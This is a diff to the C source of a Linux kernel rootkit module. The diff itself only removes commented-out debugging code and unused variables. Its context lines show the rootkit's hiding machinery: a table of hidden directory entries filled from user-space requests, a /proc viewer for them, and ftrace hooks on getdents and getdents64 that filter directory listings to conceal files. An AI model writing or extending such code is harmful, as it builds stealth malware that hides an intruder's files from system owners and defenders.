@@ -217,24 +217,11 @@ static int process_hide_request(struct hide_request *request)
 	struct dentry_identifier *entries = kmalloc(request->count *
 						sizeof(struct dentry_identifier),
 						GFP_ATOMIC);
-	//unsigned char *id_bytes = (unsigned char*)entries;
 	if (copy_from_user(entries,(struct dentry_identifer*)request->idents,
 				request->count * sizeof(struct dentry_identifier))) {
 		ret = 1;
 		goto out;
 	}
-	/*
-	for (i = 0; i < 350; i++) {
-		if (i % 64 == 0)
-			printk("\n0x%06x\t",i);
-		else if ( i % 16 == 0)
-			printk(KERN_CONT "  ");
-		else if (i % 4 == 0)
-			printk(KERN_CONT " ");
-		printk(KERN_CONT "%02x",id_bytes[i]);
-	}
-	printk("\n");
-	*/
 	for (i = 0; i < request->count; i++)
 		add_hidden_entry_to_table(&entries[i]);
 out:
@@ -264,9 +251,7 @@ out:
 #ifdef CONFIG_X86_64
 static void rem_hidden_entry_from_table(struct dentry_identifier *old_id)
 {
-	//int err;
 	struct hidden_entry *old_entry;
-	//struct hidden_entry *old_id = req_to_entry(identifier);
 	atomic_inc(&hidden_table_users);
 	old_entry = rhashtable_lookup_fast(&hidden_table,
 					old_id,
@@ -290,24 +275,11 @@ static int process_show_request(struct hide_request *request)
 	struct dentry_identifier *entries = kmalloc(request->count *
 						sizeof(struct dentry_identifier),
 						GFP_ATOMIC);
-	//unsigned char *id_bytes = (unsigned char*)entries;
 	if (copy_from_user(entries,(struct dentry_identifer*)request->idents,
 				request->count * sizeof(struct dentry_identifier))) {
 		ret = 1;
 		goto out;
 	}
-	/*
-	for (i = 0; i < 350; i++) {
-		if (i % 64 == 0)
-			printk("\n0x%06x\t",i);
-		else if ( i % 16 == 0)
-			printk(KERN_CONT "  ");
-		else if (i % 4 == 0)
-			printk(KERN_CONT " ");
-		printk(KERN_CONT "%02x",id_bytes[i]);
-	}
-	printk("\n");
-	*/
 	for (i = 0; i < request->count; i++)
 		rem_hidden_entry_from_table(&entries[i]);
 out:
@@ -392,7 +364,6 @@ struct proc_dir_entry *hidden_file_viewer;
 
 static int hidden_proc_show(struct seq_file *p, void *v)
 {
-	//struct dentry_identifier dentry_id_copy;
 	struct rhashtable_iter iter;
 	struct dentry_identifier *dentry_id;
 	unsigned long flags;
@@ -532,7 +503,6 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
 {
 	int fd = regs->di;
 	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
-	//int count = regs->dx;
 
 	long error;
 	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
@@ -674,11 +644,7 @@ out:
 
 static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
 static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
-/*
-static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
-{
-}
-*/
+
 #endif //PTREGS_SYSCALL_STUBS
 
 static struct ftrace_hook hooks[] = {
@@ -702,7 +668,6 @@ static int __init rootkit_init(void)
 {
 	int error;
 	printk(KERN_INFO "rootkit init\n");
-	printk("size of ino:%ld\n",sizeof(ino_t));
 #ifdef CONFIG_X86_64
 	spin_lock_init(&hidden_table_lock);
 	atomic_set(&hidden_table_users,0);
